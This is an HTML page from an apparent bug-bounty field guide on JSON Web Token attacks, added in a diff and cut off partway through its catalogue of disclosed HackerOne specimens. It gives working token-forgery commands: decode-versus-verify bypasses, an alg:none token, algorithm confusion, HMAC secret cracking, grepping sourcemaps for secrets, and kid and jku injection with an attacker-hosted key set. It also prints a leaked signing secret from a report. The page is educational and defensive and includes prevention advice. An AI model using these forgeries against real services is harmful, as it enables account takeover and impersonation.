@@ -1,0 +1,299 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>JSON Web Tokens (JWT) · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Attack surface</b><span class="sep">/</span><b>JSON Web Tokens (JWT)</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="on" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-crit)"></span>Attack surface</div>
+      <h1>JSON Web Tokens (JWT)</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>10</b></span><a class="chip lab" href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener">⚑ Practice — PortSwigger: <b>JWT</b></a></div>
+    </header>
+    <div class="thin-note">⚠ Thin coverage — only 10 disclosed reports for this class; illustrative, not exhaustive.</div>
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>A JSON Web Token is a base64url-encoded <code>header.payload.signature</code> triple. The server hands it to the client after login, the client sends it back on every request, and the server is supposed to trust the claims inside (<code>sub</code>, <code>email</code>, <code>jti</code>, <code>groups</code>, <code>exp</code>) <strong>only if the signature verifies with the expected key and the expected algorithm</strong>. That single check is the entire security boundary.</p>
+<p>Every JWT bug is one variation on the server skipping, weakening, or misconfiguring that check and then trusting attacker-controlled claims as identity. Because the payload <em>is</em> the identity, a token you can forge or replay makes you whoever the payload says you are — so JWT flaws are best treated as <strong>direct authentication-bypass and account-takeover primitives</strong>, not crypto curiosities. The three parts are all attacker-visible and attacker-editable; the only thing standing between you and impersonating any user is whether the verifier does its job.</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Grab a token and decode it locally.</strong> Split on the dots, <code>base64url -d</code> parts 1 and 2. Never paste a live-engagement token into a hosted decoder — decode offline.</li><li><strong>Read the header</strong> (<code>alg</code>, <code>kid</code>, <code>jku</code>, <code>x5u</code>) and note <strong>which payload claim carries identity</strong> (<code>sub</code>, <code>email</code>, <code>jti</code>, <code>uid</code>, <code>u</code>, <code>groups</code>). That claim is the one you flip.</li><li><strong>Fingerprint the library/stack</strong> — Node <code>jsonwebtoken</code>, PyJWT, <code>jose</code>, Prosody/<code>luajwtjitsi</code>, Auth0, Keycloak, Argo CD — each has its own signature failure modes.</li><li><strong>Run the differential ladder</strong> below: mutate the token so it <em>should</em> be rejected, and watch for the tell — the server still accepts it.</li><li><strong>Confirm identity flipped</strong>, not just "200 OK". Look at a <code>/me</code>-style echo, or fetch a resource only the victim can see.</li><li>For <strong>microservice fleets</strong>, replay the <em>same</em> tampered token against every distinct backend and diff which ones accept it — validation is rarely uniform.</li></ol>
+<div class="pre" data-lang="bash"># The one tell that matters: the server STILL accepts the token after you break it.
+# Mutate the identity claim, then attack the signature by each route in turn:
+#   payload(email=VICTIM) + old signature   -&gt; decode(), not verify()?
+#   alg:none, empty signature                -&gt; unsigned tokens trusted?
+#   RS256 -&gt; HS256, public key as HMAC secret -&gt; algorithm not pinned?
+#   exp set to the past                       -&gt; claims not validated?
+#   token from a SIBLING app, same IdP        -&gt; aud not checked?</div>
+<h2 class="sec" id="signature-validation-attacks"><span class="tick">§</span>Signature &amp; validation attacks</h2>
+<p>Work down this ladder against the specific library you fingerprinted. Each is an independent way the verifier's job goes undone.</p>
+<h3 class="sub" id="no-signature-verification-decode-vs-verify">No signature verification (decode vs verify)</h3>
+<p>The single most common JWT bug. The middleware reads the token with a <strong>decode</strong> call (<code>jwt.decode()</code>, <code>jwt_decode()</code>, or a hand-rolled base64 split) that parses the payload <em>without</em> checking the signature, then trusts the identity claim inside. Mutate the identity claim, leave the signature field arbitrary, and you are that user. Test by changing only the payload and keeping the old (now-invalid) signature — if it still authenticates, nothing verifies it.</p>
+<div class="pre" data-lang="bash"># Middleware does jwt.decode(token) and trusts payload.jti as the user id.
+# Same bogus signature on both — only the payload changed.
+curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjF9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc" https://TARGET/   # -&gt; user 1
+curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc" https://TARGET/   # -&gt; user 2, sig never checked</div>
+<p>Some login endpoints trust an <code>email</code>/<code>sub</code> claim after a decode. Craft the payload, sign with anything, POST it:</p>
+<div class="pre" data-lang="bash"># Login/registration endpoint decodes but never verifies -&gt; forge the email claim.
+url="https://TARGET/wp-json/newspack-extended-access/v1/google/register"
+token="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6InZpY3RpbUBleGFtcGxlLm9yZyJ9.anything"
+curl -s "$url" -H 'Content-Type: text/plain' --data-binary "$token"   # now authed as VICTIM</div>
+<div class="callout note"><span class="ico">● NOTE</span><div>The same class hides in <strong>reissue/refresh</strong> endpoints. If <code>POST /token</code> cryptographically verifies only the <em>refresh</em> token and then merely <code>decode()</code>-compares the access token, tamper the access token's payload — the server re-signs your forged claims into a fresh, validly-signed token. Both tokens in a compare/reissue flow must be verified, not decoded.</div></div>
+<h3 class="sub" id="alg-none">alg:none</h3>
+<p>The JWT spec allows an <code>alg</code> of <code>none</code> — an <em>unsecured</em> token with no signature at all. A verifier that honours the token's own <code>alg</code> header will accept it with an empty signature. Set the header, keep the trailing dot, drop the signature.</p>
+<div class="pre" data-lang="bash"># header {"alg":"none","typ":"JWT"}  payload {"sub":"VICTIM","role":"admin"}
+# Note the trailing dot and empty signature.
+printf '%s' '{"alg":"none","typ":"JWT"}' | basenc --base64url | tr -d '='   # eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+# Final token:  &lt;b64url header&gt;.&lt;b64url payload&gt;.
+curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJWSUNUSU0iLCJyb2xlIjoiYWRtaW4ifQ." https://TARGET/</div>
+<div class="callout tip"><span class="ico">▸ TIP</span><div>If <code>none</code> is blacklisted, try case and spacing variants — <code>None</code>, <code>NONE</code>, <code>nOnE</code> — many blacklists match only the exact lowercase string while the library lowercases before dispatch.</div></div>
+<h3 class="sub" id="algorithm-confusion-rs256-hs256">Algorithm confusion (RS256 → HS256)</h3>
+<p>The token was issued RS256 (asymmetric: private key signs, public key verifies). If the verifier picks the algorithm from the <strong>token's</strong> <code>alg</code> header instead of pinning it to the configured key type, switch <code>alg</code> to HS256 and <strong>HMAC-sign with the RSA public key bytes as the secret</strong>. The public key is not secret — it is published in JWKS, a cert, or the TLS chain — so it becomes a perfectly good HMAC key the server will accept.</p>
+<div class="pre" data-lang="bash"># 1. Fetch the public key (JWKS, /.well-known, or extract from the TLS cert) as PEM.
+# 2. Forge header {"alg":"HS256","typ":"JWT"} + your payload.
+# 3. HMAC-SHA256 over  b64url(header) + "." + b64url(payload)  using the PEM bytes as the key.
+jwt_tool &lt;TOKEN&gt; -X k -pk public.pem        # jwt_tool automates the confusion attack
+# or with a raw openssl HMAC using public.pem as -hmackey</div>
+<h3 class="sub" id="weak-or-leaked-hmac-secret">Weak or leaked HMAC secret</h3>
+<p>HS256 security collapses if the shared secret is guessable (<code>secret</code>, <code>changeme</code>, a framework default) or exposed. Crack it offline; if you recover it, you can mint any token. Client-side SSO is the classic exposure — an SPA that HMAC-signs the JWT <em>in the browser</em> ships the secret in the JS bundle or a leftover <code>.js.map</code> sourcemap.</p>
+<div class="pre" data-lang="bash"># Offline dictionary/brute crack of the HS256 secret.
+hashcat -a 0 -m 16500 token.jwt wordlist.txt        # or: john --format=HMAC-SHA256
+
+# Client-minted SSO: pull the sourcemap, grep the secret, mint for the victim.
+curl -s https://TARGET/static/app.js.map | grep -Eo '[A-Z_]*SECRET[^"]*'   # REACT_APP_ZENDESK_SECRET=...
+# HS256-sign {"iat":&lt;now&gt;,"jti":"&lt;uuid&gt;","name":"x","email":"VICTIM"} with that secret, then:
+curl "https://TARGET.zendesk.com/access/jwt?jwt=&lt;forged&gt;"                   # logged in as VICTIM</div>
+<h3 class="sub" id="kid-jku-x5u-header-injection">kid / jku / x5u header injection</h3>
+<p>Header parameters tell the verifier <em>where to find the key</em>. If they are trusted unsanitised, you control the key.</p>
+<ul><li><strong><code>kid</code></strong> (key id) is often used as a filename or DB lookup — path-traversal it to a file with known contents (sign with that content), or SQL/command-inject it.</li><li><strong><code>jku</code> / <code>x5u</code></strong> point to a JWKS/cert URL — if the host allowlist is missing, host your own key set and point the verifier at <code>COLLAB</code>.</li></ul>
+<div class="pre" data-lang="bash"># kid path traversal to a predictable file -&gt; sign HS256 with that file's known bytes.
+{"alg":"HS256","kid":"../../../../../../dev/null","typ":"JWT"}   # key = "" (empty) -&gt; sign with empty secret
+
+# jku pointing at attacker JWKS (RS256): server fetches YOUR public key and verifies YOUR signature.
+{"alg":"RS256","jku":"https://COLLAB/jwks.json","typ":"JWT"}</div>
+<h3 class="sub" id="claim-tampering-exp-aud-sub">Claim tampering (exp / aud / sub)</h3>
+<p>Even a verified signature is not enough if the <em>claims</em> go unchecked. If a backend skips proper <code>exp</code> handling, a past-dated token still passes. If <code>aud</code> is not enforced, a validly-signed token minted for a <strong>different audience of the same IdP</strong> is accepted and mapped to local privileges through its <code>groups</code> claim.</p>
+<div class="pre" data-lang="bash"># Past-dated exp accepted by a lax microservice:
+{"sub":"VICTIM","exp":1000000000}   # 2001 — replay against every backend, diff which accept it
+
+# Cross-audience OIDC replay — signature is valid, aud is simply never checked:
+# Authorization: Bearer &lt;valid-signed token from a SIBLING app on the same IdP, groups=admins&gt;</div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<p>Each row is a real validation or token-trust failure; "Seen in" cites the report it came from.</p>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td>Middleware reads the token</td><td><code>jwt.decode()</code> (no sig check) trusts the payload identity — flip the claim, keep the old signature</td><td>#748214</td></tr><tr><td>Reissue endpoint verifies a token</td><td><code>/token</code> verifies only the <em>refresh</em> token, <code>decode()</code>-compares the rest — tamper the access payload, it gets re-signed</td><td>#736522</td></tr><tr><td>Login endpoint "checks" the JWT</td><td>Payload decoded, <code>email</code> claim trusted; unsigned / wrong-key token accepted</td><td>#2472798</td></tr><tr><td>RS256 asymmetric verification</td><td><code>alg</code> not pinned to key type — switch to HS256, sign with the RSA <strong>public</strong> key as the HMAC secret</td><td>#1210502</td></tr><tr><td>Signature verified (false confidence)</td><td><code>aud</code> never validated — replay a signature-valid token from a sibling IdP audience</td><td>#1889161</td></tr><tr><td>Expiry validation</td><td>Some backends skip <code>exp</code>/signature checks — a past-dated <code>exp</code> still passes</td><td>#1760403</td></tr><tr><td>Secret kept "server-side"</td><td>HMAC signing secret shipped in the JS bundle / <code>.js.map</code> sourcemap — mint any-email token</td><td>#638635</td></tr><tr><td>Authz on the admin UI page</td><td>The JWT-minting <code>get-started</code>/<code>connect</code> servlet behind it enforces no role check</td><td>#1103582</td></tr><tr><td>Token revoked at the IdP</td><td>No server-side revocation — token trusted until <code>exp</code> after account disable/delete</td><td>#2122690</td></tr><tr><td>Session lifetime</td><td>Long-lived, non-revocable OIDC/SIWA bearer token — one interception = durable multi-device ATO</td><td>#1593413</td></tr></tbody></table></div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div>"The signature is valid" is <strong>not</strong> proof the token is safe. A verified signature only says <em>the issuer minted these bytes</em> — it says nothing about <code>aud</code>, <code>exp</code>, <code>iss</code>, <code>nbf</code>, or whether the account still exists. The <code>aud</code>-skip (#1889161) and the past-<code>exp</code> (#1760403) cases both have perfectly valid signatures.</div></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<ul><li><strong>JWT forge → full account takeover</strong> — the dominant outcome; impersonate any user by mutating the single identity claim the server reads for authz (<code>jti</code>, <code>email</code>, <code>sub</code>, <code>u</code>). Almost every JWT flaw in the corpus terminates in ATO.</li><li><strong>Missing <code>aud</code> → privilege via <code>groups</code></strong> — a signature-valid token from a sibling audience maps to admin through its group claim (#1889161); pair with the <a href="#"> 2 </a> surface.</li><li><strong>Sourcemap secret disclosure → SSO forge</strong> — an info-leak feeds the crypto break (#638635); client-side minting is always secret-in-the-client.</li><li><strong>Low-priv JWT leak → tenant/data disclosure</strong> — a token minted without a role check links an unowned integration and exposes private projects/issues (#1103582).</li><li><strong>Deprovisioning / lifetime bypass</strong> — a disabled IdP account keeps reaching SaaS apps because the token's captured state is trusted over a live check (#2122690); long-lived non-revocable tokens turn one interception into durable ATO (#1593413).</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>Always <code>verify()</code>, never <code>decode()</code></strong> to read identity. Grep for <code>jwt.decode(</code> (or a manual base64 split) feeding <code>sub</code>/<code>jti</code>/<code>email</code>/<code>uid</code> into an auth decision — that is the bug. In any compare/reissue flow, <strong>both</strong> tokens must be cryptographically verified.</li><li><strong>Pin the algorithm to the key type</strong> on the verifier: reject <code>none</code>, and reject <code>HS*</code> where an RSA/EC key is configured. This closes <code>alg:none</code> and RS256→HS256 confusion in one move.</li><li><strong>Validate every standard claim</strong>, not just the signature: <code>exp</code> (reject past-dated), <code>aud</code> (reject sibling audiences), <code>iss</code>, <code>nbf</code>.</li><li><strong>Use strong, high-entropy HMAC secrets</strong>; never sign tokens client-side; keep secrets server-side and strip <code>.js.map</code> sourcemaps from production.</li><li><strong>Allowlist <code>jku</code>/<code>x5u</code> hosts and sanitise <code>kid</code></strong> — treat every header parameter as attacker-controlled.</li><li><strong>Support revocation / short lifetimes / live account re-checks</strong> so a logout, disable, role change, or password reset invalidates outstanding tokens.</li><li><strong>Recognising a non-exploitable variant:</strong> if tampering <em>any</em> byte of header/payload/signature yields a clean <code>401</code>, and past-<code>exp</code> / sibling-<code>aud</code> / <code>alg:none</code> all reject, the verifier is doing its job — move on.</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>jwt_tool</strong> — <code>alg:none</code>, algorithm confusion, <code>kid</code>/<code>jku</code>/<code>x5u</code> injection, key confusion, tampering, and automated attack playbooks.</li><li><strong>hashcat</strong> (<code>-m 16500</code>) / <strong>john</strong> (<code>HMAC-SHA256</code>) — offline HS256 secret cracking.</li><li><strong>Burp Suite</strong> — Repeater plus the <strong>JWT Editor</strong> extension for live tampering and replay.</li><li><strong>jwt.io</strong> — local decode/inspection only (never paste live-engagement tokens into the hosted site).</li><li><strong>Sourcemap tooling</strong> — <code>.js.map</code> fetch + <code>grep</code> for <code>*_SECRET</code>/HMAC keys to recover client-side signing keys.</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>10</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-1889161" style="--sv:var(--sev-crit)" data-sev="4" data-votes="97" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OIDC JWT aud (audience) claim not validated</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1889161</b> · ibb · awarded · 97 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>api</b></span><span>Tag <b>jwt</b></span><span>Tag <b>oauth</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Argo CD (CVE-2023-22482, v1.8.2+) validates the OIDC token signature but never checks the aud claim, so a validly-signed token minted for a different audience of the same IdP is accepted and mapped to Argo privileges via its groups claim.</p>
+<h4>Method</h4><ol><li>Identify an OIDC-protected service sharing an IdP with other audiences</li><li>Obtain a valid token issued for a different audience (same IdP)</li><li>Present it to the target; if aud isn't checked, it's accepted with the token's groups</li></ol>
+<div class="pre">Authorization: Bearer &lt;valid-signed-JWT with aud=other-service, groups=admins&gt;</div>
+<p class="insight"><b>Insight —</b> When testing OIDC/JWT auth, check aud enforcement: reuse a token from a sibling app on the same IdP. Signature-valid does not mean intended-for-this-service; missing aud check widens stolen-token blast radius.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1889161" target="_blank" rel="noopener">hackerone.com/reports/1889161</a></span><a class="src" href="#report-1889161" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1760403" style="--sv:var(--sev-high)" data-sev="3" data-votes="142" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>JWT accepted with past-dated exp (broken expiry/signature validation)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1760403</b> · linktree · awarded · 142 votes · resolved</div>
+<div class="taxo"><span>Program <b>linktree</b></span><span>Surface <b>api</b></span><span>Tag <b>jwt</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Some backend microservices did not properly validate the JWT; setting the expiration claim to a Unix timestamp in the past bypassed validation, enabling account takeover.</p>
+<h4>Method</h4><ol><li>Obtain any JWT</li><li>Set exp to a timestamp in the past (and/or tamper other claims)</li><li>Send to backend services - some accept it without proper signature/expiry checks</li><li>Use for account takeover on the services with weak validation</li></ol>
+<div class="pre"># modify JWT payload:
+{"sub":"victim","exp":1000000000}
+# then present to each backend service and diff which ones accept it</div>
+<p class="insight"><b>Insight —</b> Never assume uniform JWT validation across a microservice fleet; replay a tampered token (past exp, alg:none, swapped kid, changed sub) against every distinct backend - one service with lax validation is enough.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1760403" target="_blank" rel="noopener">hackerone.com/reports/1760403</a></span><a class="src" href="#report-1760403" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-638635" style="--sv:var(--sev-high)" data-sev="3" data-votes="101" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Client-side SSO JWT signing with secret in JS/sourcemap</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#638635</b> · trint · none · 101 votes · resolved</div>
+<div class="taxo"><span>Program <b>trint</b></span><span>Surface <b>web</b></span><span>Chain <b>secret disclosure -&gt; forge SSO JWT -&gt; impersonate any </b></span><span>Tag <b>jwt</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Zendesk SSO JWTs are generated in the browser, so the HMAC signing secret is shipped in client JS (recoverable from the sourcemap); anyone can mint a JWT for any email and impersonate that user.</p>
+<h4>Method</h4><ol><li>Grab the app JS and its .js.map sourcemap</li><li>Grep the map for the secret env var (REACT_APP_ZENDESK_SECRET)</li><li>Build a JWT {iat, jti(uuid), name, email:victim} signed HS256 with that secret</li><li>GET https://TARGET.zendesk.com/access/jwt?jwt=&lt;token&gt; -&gt; logged in as victim</li></ol>
+<div class="pre">REACT_APP_ZENDESK_SECRET = "oq1HJ4jXo99Wt41bwvLh9BXBVdgpi52CjkXbThow7UhWQGtJ"
+# HS256 sign {"iat":&lt;now&gt;,"jti":"&lt;uuidv4&gt;","name":"x","email":"victim@x.com"}</div>
+<p class="insight"><b>Insight —</b> Any client-side token minting = secret in the client. Always pull .js.map sourcemaps and grep for *_SECRET/HMAC keys; SSO/JWT generation belongs server-side.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/638635" target="_blank" rel="noopener">hackerone.com/reports/638635</a></span><a class="src" href="#report-638635" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-748214" style="--sv:var(--sev-high)" data-sev="3" data-votes="12" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>jwt.decode() without verify() — forge any identity</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#748214</b> · nodejs-ecosystem · none · 12 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>api</b></span><span>Tag <b>jwt</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The express-laravel-passport middleware reads the JWT with jwt.decode(token) (which parses without checking the signature) and trusts the jti/user id from the payload. An attacker can craft any payload, keep a bogus signature, and be authenticated as any user.</p>
